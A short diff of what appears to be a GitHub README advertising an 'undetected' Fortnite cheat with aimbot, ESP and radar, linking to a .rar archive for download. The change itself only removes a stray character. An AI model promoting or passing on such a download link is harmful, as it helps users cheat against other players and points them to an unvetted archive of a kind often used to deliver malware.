@@ -3,7 +3,7 @@
   🎯 [Fortnite External](https://github.com/Winnerplipleat58/Fortnite-External/releases/download/fortnite1.8/fortnite1.8.rar)
 
  > **The ultimate, feature-rich undetected utility for Fortnite. Full control over Aimbot, ESP, Radar, and Performance options.**
-  3
+ 
   <br/> 
 <table>
   <tr>
